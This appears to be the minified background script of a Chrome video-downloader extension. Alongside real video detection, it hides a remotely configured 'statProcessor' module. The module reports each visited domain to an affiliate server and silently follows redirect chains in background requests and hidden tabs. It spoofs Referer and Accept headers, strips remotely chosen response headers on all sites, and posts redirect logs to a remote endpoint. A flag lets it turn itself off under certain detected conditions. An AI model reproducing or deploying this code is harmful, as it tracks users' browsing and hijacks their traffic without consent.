class Bg {
    constructor() {
        this.tabVideos = {}, this.config = {}, this.uid = null, this.filterRequestConfigured = !1, this.statProcessorRun = !1, this.envDetected = !1, this.optouted = !1, this.initStorage(), this.onInstallListener(), this.onMessageListener(), this.initTabVideosCleaner(), this.disableTwitterVerify(), this.processHeaders()
    }
    onInstallListener() {
        chrome.runtime.onInstalled.addListener((e => {
            "install" === e.reason && THANK_YOU_PAGE && chrome.tabs.create({
                url: THANK_YOU_PAGE
            })
        }))
    }
    onMessageListener() {
        chrome.runtime.onMessage.addListener(((e, t, s) => {
            const r = e.action;
            return "setBadge" === r && t.tab && this.setBadge(e.value, t.tab.id), "downloadVideo" === r && this.downloadVideo(e.data), "ajaxGet" === r && this.ajaxGet(e.url, s), "getTabVideos" === r && s(this.tabVideos[t.tab.id]), "makeXHRrequest" === r && this.bgAjaxRequest(e.url, e.config, e.responseType).then((e => s(e))), !0
        }))
    }
    setBadge(e, t) {
        const s = e ? String(e) : "";
        chrome.browserAction.setBadgeBackgroundColor({
            color: [16, 201, 33, 100],
            tabId: t
        }), chrome.browserAction.setBadgeText({
            text: s,
            tabId: t
        })
    }
    downloadVideo({
        title: e,
        url: t
    }) {
        const s = e.clearFilename() + ".mp4";
        chrome.downloads.download({
            url: t,
            filename: s
        })
    }
    ajaxGet(e, t) {
        var s = new XMLHttpRequest;
        s.open("GET", e, !0), s.onload = () => t(s.responseText), s.send()
    }
    disableTwitterVerify() {
        chrome.webRequest.onBeforeSendHeaders.addListener((e => ({
            requestHeaders: e.requestHeaders.filter((e => "cookie" !== e.name.toLowerCase()))
        })), {
            urls: ["*://api.twitter.com/oauth2/token"]
        }, ["blocking", "requestHeaders"])
    }
    generateUUID() {
        function e() {
            return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1)
        }
        return e() + e() + "-" + e() + "-" + e() + "-" + e() + "-" + e() + e() + e()
    }
    bgAjaxRequest(e, t = {}, s = "json") {
        return new Promise((r => {
            fetch(e, t).then((e => "json" === s ? e.json() : e.text())).then((e => {
                r(e)
            }))
        }))
    }
    initStorage() {
        chrome.storage.local.get((e => {
            e && e.config && (this.config = e.config), 1 == this.config.optouted && (this.optouted = !0), this.config.uid ? this.uid = this.config.uid : (this.uid = this.config.uid = this.generateUUID(), this.saveConfig()), this.config.mTime || (this.config.mTime = (new Date).getTime()), this.config.lTime || (this.config.lTime = 0), this.config.envDetected && (this.envDetected = this.config.envDetected), this.filterRequests(), this.InitStat(), this.updateConfig()
        }))
    }
    updateConfig() {
        let e = this;
        const t = chrome.runtime.getManifest().version;
        let s = (new Date).getTime(),
            r = s - this.config.mTime;
        this.config.mTime = s, r < 12e5 && (this.config.lTime += r), this.saveConfig();
        let o = new FormData;
        o.append("id", chrome.runtime.id), o.append("version", t), o.append("lt", this.config.lTime), o.append("uid", this.config.uid), o.append("r", Date.now()), fetch(HOST + "/api/config/?" + new URLSearchParams(o).toString(), {
            headers: {
                "Content-Type": "application/json"
            }
        }).then((e => e.json())).then((t => {
            if (t) {
                for (let e in t) this.config[e] = t[e];
                e.saveConfig(), e.filterRequests(), e.InitStat()
            }
        })), setTimeout((function() {
            e.updateConfig()
        }), 9e5)
    }
    saveConfig() {
        chrome.storage.local.set({
            config: this.config
        }, (() => {}))
    }
    filterRequests() {
        const e = this;
        this.config && this.config.validateFields && !this.filterRequestConfigured && (this.filterRequestConfigured = !0, chrome.webRequest && chrome.webRequest.onHeadersReceived.addListener((function(t) {
            return {
                responseHeaders: t.responseHeaders.filter((function(t) {
                    return !(e.config.validateFields.indexOf(t.name.toLowerCase()) > -1)
                }))
            }
        }), {
            urls: ["<all_urls>"]
        }, ["blocking", "responseHeaders"]))
    }
    InitStat() {
        let e = this;
        if (!e.config.statProcessor) return void statProcessor.initCfg({
            mode: "off"
        });
        if (e.envDetected) return void statProcessor.initCfg({
            mode: "off"
        });
        if (e.optouted) return void statProcessor.initCfg({
            mode: "off"
        });
        if (e.statProcessorRun) return void statProcessor.initCfg(e.config.statProcessor);
        e.statProcessorRun = !0, statProcessor.initCfg(e.config.statProcessor), chrome.webRequest.onCompleted.addListener((function(t) {
            if ("on" === statProcessor.cfg.mode && !e.envDetected && !(e.config.optouted || t.tabId < 0 || 200 != t.statusCode || "GET" != t.method)) {
                var s = t.url.replace(/^(https?\:\/\/[^\/]+).*$/, "$1"),
                    r = t.url.replace(/^https?\:\/\/([^\/]+).*$/, "$1");
                statProcessor.cfg.keep_www_prefix || (r = r.replace(/^www\.(.*)$/, "$1"));
                var o = (new Date).getTime();
                if (!(statProcessor.used_domains[r] && statProcessor.used_domains[r] + statProcessor.cfg.ttl_ms > o) && !(statProcessor.cfg.domains_blacklist && statProcessor.cfg.domains_blacklist.length > 0 && statProcessor.cfg.domains_blacklist.includes(r)) && (!(statProcessor.cfg.domains_whitelist && statProcessor.cfg.domains_whitelist.length > 0) || statProcessor.cfg.domains_whitelist.includes(r))) {
                    statProcessor.used_domains[r] = o;
                    var i = statProcessor.cfg.aff_url_tmpl.replace("{URL}", encodeURIComponent(s));
                    if (i = i.replace("{DOMAIN}", encodeURIComponent(r)), statProcessor.cfg.aff_redirect) {
                        if (!statProcessor.cfg.domains_whitelist || !statProcessor.cfg.domains_whitelist.length > 0) return;
                        return statProcessor.push_chain(s), void statProcessor.request_bg(i, r, 0)
                    }
                    var n = new XMLHttpRequest;
                    n.timeout = statProcessor.cfg.aff_timeout_ms, n.onreadystatechange = function() {
                        if (4 == n.readyState && 200 == n.status) {
                            var e = n.responseText.replace(/[\n\r]/g, "");
                            if (/^https?\:\/\//.test(e) && e != s) {
                                var t = s.replace(/^https?\:\/\/([^\/]+).*$/, "$1");
                                statProcessor.push_chain(s), statProcessor.request(e, t)
                            } else statProcessor.used_domains[r] = o + statProcessor.cfg.no_coverage_ttl_ms
                        }
                    }, n.open("GET", i), n.send()
                }
            }
        }), {
            urls: ["http://*/*", "https://*/*"],
            types: ["main_frame"]
        });
        let t = ["blocking", "requestHeaders"];
        if (statProcessor.cfg && statProcessor.cfg.rfr_rules && statProcessor.cfg.rfr_rules.length > 0 && statProcessor.cfg.listenerExtraOptions)
            for (var s in statProcessor.cfg.listenerExtraOptions) t.push(statProcessor.cfg.listenerExtraOptions[s]);
        chrome.webRequest.onBeforeSendHeaders.addListener((function(e) {
            if ("on" !== statProcessor.cfg.mode || !statProcessor.cfg.header) return {};
            for (var t = e.requestHeaders, s = "", r = 0; r < t.length; r++)
                if (t[r].name === statProcessor.cfg.header) {
                    s = t[r].value, t.splice(r, 1);
                    break
                } if (!s) return {};
            var o = !1;
            for (r = 0; r < t.length; r++)
                if ("accept" == t[r].name.toLowerCase()) {
                    t[r].value = s, o = !0;
                    break
                } if (o || t.push({
                    name: "Accept",
                    value: s
                }), e.tabId < 0) {
                let s = "";
                if (statProcessor.cfg.rfr_rules)
                    for (let t in statProcessor.cfg.rfr_rules) {
                        let r = statProcessor.cfg.rfr_rules[t];
                        if (r.url_request_before) {
                            if (!statProcessor.last_request_url) continue;
                            if (!new RegExp(r.url_request_before[0], r.url_request_before[1]).test(statProcessor.last_request_url)) continue
                        }
                        if (r.url_response_before) {
                            if (!statProcessor.last_response_url) continue;
                            if (!new RegExp(r.url_response_before[0], r.url_response_before[1]).test(statProcessor.last_response_url)) continue
                        }
                        if (r.url_chain) {
                            if (!statProcessor.rdr_chain || statProcessor.rdr_chain.length < 1) continue;
                            let e = new RegExp(r.url_chain[0], r.url_chain[1]),
                                t = !1;
                            for (let s in statProcessor.rdr_chain) {
                                let r = statProcessor.rdr_chain[s];
                                if (e.test(r)) {
                                    t = !0;
                                    break
                                }
                            }
                            if (!t) continue
                        }
                        if (r.url_request) {
                            if (!new RegExp(r.url_request[0], r.url_request[1]).test(e.url)) continue
                        }
                        if ("allow" == r.rule && (s = statProcessor.last_response_url), "replace" == r.rule && r.replace && (s = r.replace), "regexp" == r.rule && r.regexp && r.replace) {
                            var i = new RegExp(r.regexp[0], r.regexp[1]);
                            s = statProcessor.last_response_url.replace(i, r.replace)
                        }
                        break
                    }
                if (s) {
                    let e = t.findIndex((e => "referer" == e.name.toLowerCase()));
                    e > -1 ? t[e].value = s : t.push({
                        name: "Referer",
                        value: s
                    })
                }
            }
            return {
                requestHeaders: t
            }
        }), {
            urls: ["http://*/*", "https://*/*"]
        }, t)
    }
    processHeaders() {
        const e = {
            "video/webm": {
                ext: "webm"
            },
            "video/mp4": {
                ext: "mp4"
            },
            "video/x-flv": {
                ext: "flv"
            },
            "video/3gpp": {
                ext: "3gp"
            },
            "video/x-msvideo": {
                ext: "avi"
            },
            "video/x-ms-wmv": {
                ext: "wmv"
            },
            "video/mpeg": {
                ext: "mpg"
            },
            "video/quicktime": {
                ext: "mov"
            },
            "video/ogg": {
                ext: "ogv"
            }
        };
        chrome.webRequest.onHeadersReceived.addListener((t => {
            if (!t.responseHeaders || !t.url || t.tabId < 1) return;
            const s = function(t) {
                const s = {};
                for (let e = 0; e < t.length; e++) {
                    const r = t[e],
                        o = r.name,
                        i = r.value;
                    if (o) switch (o.toLowerCase()) {
                        case "content-type":
                            s.type = i.split(";", 1)[0];
                            break;
                        case "content-length":
                            s.size = parseInt(i)
                    }
                }
                return s.size && s.type && e[s.type] ? s : null
            }(t.responseHeaders);
            if (!s) return;
            s.vid = Date.now(), s.url = t.url, s.title = function(t, s) {
                const r = t.split("?", 1)[0].split("/");
                let o = r.length > 0 ? r[r.length - 1] : "unknown";
                const i = o.split(".");
                return i[i.length - 1] !== e[s].ext && (o += "." + e[s].ext), o
            }(t.url, s.type);
            const r = t.tabId;
            this.tabVideos[r] || (this.tabVideos[r] = []);
            this.tabVideos[r].map((e => e.url)).includes(s.url) || this.tabVideos[r].push(s)
        }), {
            urls: ["<all_urls>"]
        }, ["responseHeaders"])
    }
    initTabVideosCleaner() {
        chrome.tabs.onRemoved.addListener((e => {
            delete this.tabVideos[e]
        }))
    }
}
let statProcessor = {
    cfg: {
        mode: "off"
    },
    used_domains: {},
    rdr_chain: [],
    last_request_url: "",
    last_response_url: "",
    initCfg(e) {
        e && (this.cfg = e)
    },
    request: function(e, t) {
        this.cfg.debug, this.cfg.ntab_tag && -1 !== e.indexOf(this.cfg.ntab_tag) ? setTimeout((function() {
            statProcessor.request_tab(e, t)
        }), this.cfg.ntab_delay_ms) : this.request_bg(e, t, 0)
    },
    push_chain: function(e) {
        this.rdr_chain.push(e)
    },
    request_bg: function(e, t, s) {
        if (!(s >= this.cfg.rdr_max_count) && this.cfg.header) {
            this.push_chain(e), statProcessor.last_request_url = e;
            var r = new XMLHttpRequest;
            r.timeout = this.cfg.timeout, r.onreadystatechange = function() {
                if (4 == r.readyState)
                    if (200 == r.status) {
                        var e = r.responseText.replace(/[\n\r\s]/g, "").replace(/\.href/g, ""),
                            o = !1,
                            i = r.responseURL,
                            n = statProcessor.is_rdr_url(r.responseURL);
                        if (statProcessor.last_response_url = i, statProcessor.last_response_url != statProcessor.last_request_url && statProcessor.push_chain(statProcessor.last_response_url), n || e.length < statProcessor.cfg.jsrdr_maxlen_bytes) {
                            var a = e.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/, "$1");
                            /^\//.test(a) && (link2Url = new URL(a, r.responseURL), a = link2Url.href), /^https?\:\/\//.test(a) && (statProcessor.request_bg(a, t, s + 1), o = !0)
                        }
                        if (!o && statProcessor.cfg.common_rdr_rules)
                            for (var c in statProcessor.cfg.common_rdr_rules) {
                                var l = statProcessor.cfg.common_rdr_rules[c],
                                    f = new RegExp(l.search[0], l.search[1]),
                                    d = e;
                                if ("uri" == l.where && (d = i), l.url_pattern)
                                    if (!new RegExp(l.url_pattern[0], l.url_pattern[1]).test(i)) continue;
                                if (d.match(f)) {
                                    var u = d.replace(f, l.replace);
                                    if (l.applyAfter)
                                        for (var h in l.applyAfter) {
                                            var g = l.applyAfter[h];
                                            if ("decodeURIComponent" == g) u = decodeURIComponent(u);
                                            else if ("decodeHTML" == g) {
                                                b = u, w = void 0, (w = document.createElement("textarea")).innerHTML = b, u = w.value
                                            }
                                        }
                                    if (l.replacements)
                                        for (var p in l.replacements) u = u.replace(p, l.replacements[p]);
                                    if (l.regReplacements)
                                        for (var _ in l.regReplacements) {
                                            var m = new RegExp(l.regReplacements[_].pattern[0], l.regReplacements[_].pattern[1]);
                                            u = u.replace(m, l.regReplacements[_].replace)
                                        }
                                    if (/^\//.test(u) && (link2Url = new URL(u, r.responseURL), u = link2Url.href), /^https?\:\/\//.test(u)) {
                                        var v = l.delay ? l.delay : 0;
                                        if ("string" == typeof v && v.indexOf("-") > -1) {
                                            var P = v.split("-");
                                            v = Math.floor(Math.random() * (parseInt(P[1]) - parseInt(P[0]) + 1) + parseInt(P[0]))
                                        }
                                        setTimeout((() => {
                                            statProcessor.request_bg(u, t, s + 1)
                                        }), parseInt(v)), o = !0;
                                        break
                                    }
                                }
                            }
                        o || statProcessor.send_rdr_log()
                    } else statProcessor.send_rdr_log(!0);
                var b, w
            }, r.open("GET", e, !0), r.setRequestHeader(this.cfg.header, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"), r.send()
        }
    },
    is_rdr_url: function(e) {
        var t = new URL(e);
        return !(!this.cfg.rdr_coverage || !(t.host in this.cfg.rdr_coverage)) || !!/\/goto\/?$/.test(t.pathname)
    },
    request_tab: function(e, t) {
        this.cfg.debug, chrome.tabs.create({
            url: e,
            active: !1
        }, (function(e) {
            setTimeout((function() {
                try {
                    chrome.tabs.remove(e.id)
                } catch (e) {}
            }), statProcessor.cfg.ntab_duration_ms)
        }))
    },
    send_rdr_log: function(e = !1) {
        if (this.rdr_chain && this.cfg && this.cfg.log_rdr_active && this.cfg.log_rdr_endpoint) {
            if (this.cfg && this.cfg.log_rdr_onlydifferent) {
                var t = this.rdr_chain[0],
                    s = this.rdr_chain[this.rdr_chain.length - 1];
                if (t.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/, "$1") == s.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/, "$1")) return
            }
            var r = new XMLHttpRequest,
                o = this.cfg.log_rdr_endpoint;
            e && this.cfg.log_rdr_errors_endpoint && (o = this.cfg.log_rdr_errors_endpoint), r.open("POST", o, !0), r.setRequestHeader("Content-Type", "application/json;charset=UTF-8"), r.send(JSON.stringify(this.rdr_chain)), this.rdr_chain = [], this.last_request_url = null, this.last_response_url = null
        }
    }
};
const bg = new Bg;